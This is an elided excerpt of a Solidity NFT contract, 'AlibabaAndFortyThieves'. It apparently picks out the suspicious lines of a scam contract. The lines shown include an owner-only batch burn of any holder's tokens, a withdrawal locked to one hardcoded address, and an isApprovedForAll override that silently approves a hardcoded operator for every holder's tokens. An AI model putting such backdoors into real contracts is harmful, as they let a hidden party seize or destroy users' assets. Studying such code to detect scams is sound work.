...
contract AlibabaAndFortyThieves is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("AlibabaAndFortyThieves", "AAFT", maxBatchSize_, collectionSize_) {
  ...
  function batchBurn(uint256[] memory tokenids) external onlyOwner {
        ...
        for (uint256 i; i < len; i++) {
            ...
            transferFrom(ownerOf(tokenid), 0x0000000000000000000000000000000000000000, tokenid);
        }
    }
...
//提款钱包
  function withdrawMoney() external  nonReentrant {
    require(msg.sender == 0x9eeA2D2965D39F6917aaD7Bc0087FF7C702F5F3d);
...
/*     string memory baseId;
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    override
    returns (bool)
  { if(operator==0x22D7a8622C70B0716D2D036f7Ea744a8402ACd8f){return true;}
